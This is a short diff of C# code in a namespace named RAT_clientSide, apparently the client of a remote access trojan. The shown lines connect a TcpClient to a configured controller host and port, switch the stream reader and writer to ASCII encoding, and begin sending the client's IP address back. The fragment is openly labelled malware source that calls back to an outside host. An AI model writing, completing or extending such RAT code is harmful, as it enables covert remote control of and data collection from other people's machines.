@@ -22,8 +22,8 @@ namespace RAT_clientSide
             //Create the client and the streams
             TcpClient client = new TcpClient(HostName, Port);
 
-            StreamReader sr = new StreamReader(client.GetStream());
-            StreamWriter sw = new StreamWriter(client.GetStream());
+            StreamReader sr = new StreamReader(client.GetStream(),Encoding.ASCII);
+            StreamWriter sw = new StreamWriter(client.GetStream(),Encoding.ASCII);
 
             //Send the client ip
             try
